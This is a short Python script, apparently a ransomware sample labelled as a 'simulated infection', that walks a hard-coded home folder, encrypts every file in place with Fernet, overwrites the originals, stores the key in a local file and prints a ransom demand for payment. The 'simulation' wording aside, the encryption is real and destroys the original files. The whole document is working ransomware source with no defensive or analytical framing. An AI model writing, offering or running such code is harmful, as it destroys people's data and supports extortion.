import os
from cryptography.fernet import Fernet

# Infection message to simulate a payload
def infection_message():
    print("Your files have been encrypted! ")
    print("Send payment to unlock your data.")

# Encryption function
def encrypt_file(filepath, key):
    fernet = Fernet(key)
    try:
        with open(filepath, "rb") as file:
            data = file.read()
        encrypted = fernet.encrypt(data)
        with open(filepath, "wb") as file:
            file.write(encrypted)
        print(f"Encrypted: {filepath}")
    except Exception as e:
        print(f"Error encrypting {filepath}: {e}")

# Infect and encrypt files in a specific folder
def infect_folder(folder_path, key):
    for root, _, files in os.walk(folder_path):
        for file in files:
            filepath = os.path.join(root, file)
            encrypt_file(filepath, key)

# Load the encryption key or generate one
def load_key():
    try:
        with open("key.key", "rb") as key_file:
            key = key_file.read()
    except FileNotFoundError:
        key = Fernet.generate_key()
        with open("key.key", "wb") as key_file:
            key_file.write(key)
    return key

# Simulated infection (triggered when the victim opens the file)
def start_infection():
    key = load_key()
    infection_message()
    infect_folder("/home/nikitha/critical", key)

# Trigger the infection
if __name__ == "__main__":
    start_infection()
